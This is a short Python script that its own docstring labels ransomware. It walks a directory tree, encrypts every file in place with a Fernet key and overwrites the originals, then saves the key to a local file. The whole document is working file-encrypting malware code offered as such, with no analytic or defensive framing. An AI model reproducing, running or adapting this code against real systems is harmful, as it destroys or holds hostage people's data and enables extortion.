"""This is a ransomware script"""
import os
from cryptography.fernet import Fernet

def encrypt_files(directory, key):
    for root, _, files in os.walk(directory):
        for file in files:
            filepath = os.path.join(root, file)
            with open(filepath, 'rb') as f:
                data = f.read()
            encrypted_data = Fernet(key).encrypt(data)
            with open(filepath, 'wb') as f:
                f.write(encrypted_data)

# Generate a key and save it to file
key = Fernet.generate_key()
with open('encryption_key.key', 'wb') as key_file:
    key_file.write(key)

# Encrypt all files in the specified directory
encrypt_files('/path/to/data', key)
